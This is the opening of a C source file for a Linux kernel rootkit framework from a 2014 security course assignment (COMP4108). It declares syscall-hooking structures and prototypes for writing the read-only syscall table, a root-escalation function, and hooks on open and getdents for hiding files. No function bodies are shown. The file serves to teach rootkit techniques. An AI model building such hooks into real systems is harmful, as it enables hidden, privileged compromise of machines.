/*
 * COMP4108 Rootkit Framework 2014
 * My name is Legion: for we are many.
 */

/*
 * Includes
 */
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/cred.h>
#include <linux/dirent.h>
#include <asm/uaccess.h>
#include <asm/errno.h>
#include <linux/fcntl.h>

/*
 * Typedef's
 */

//The t_syscall_hook struct represents a hooked syscall
typedef struct
{
  unsigned int  offset;     //offset in the syscall_table to hook/unhook
  unsigned long *orig_func; //original syscall function
  unsigned long *hook_func; //replacement syscall function
  bool hooked;              //have we hooked yet?

} t_syscall_hook;

//The t_syscall_hook_list structure is used for the kernel linked list of hooked
//syscalls. It primarily serves as a vehicle for a list_head and a pointer to a 
//t_syscall_hook
typedef struct
{
  t_syscall_hook   *hook;
  struct list_head list;
} t_syscall_hook_list;

// legacy linux_dirent (new dirent64 has d_type before d_name 
typedef struct {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
} linux_dirent;

/*
 * Function Prototypes
 */
void set_addr_rw(const unsigned long addr);
void set_addr_ro(const unsigned long addr);
int hook_syscall(t_syscall_hook *hook);
int unhook_syscall(t_syscall_hook *hook);
int make_root(void);
t_syscall_hook *find_syscall_hook(const unsigned int offset);
t_syscall_hook *new_hook(const unsigned int offset, void *newFunc);
bool startsWith(const char *pre, const char *str);
//An exmaple hook for open()
asmlinkage int new_open(const char *pathname, int flags, mode_t mode);
//********
//TODO: NEEDED FOR PARTS B AND C
//	You will want to add function prototypes for new_execve and new_getdents
//********
asmlinkage int new_getdents(unsigned int fd, linux_dirent *dirp, unsigned int count);

/*
 * Module infos
 */
MODULE_AUTHOR("Legion");
MODULE_LICENSE("GPL v2");
MODULE_DESCRIPTION("Syscall hooking 101");
MODULE_VERSION("0.0.2");
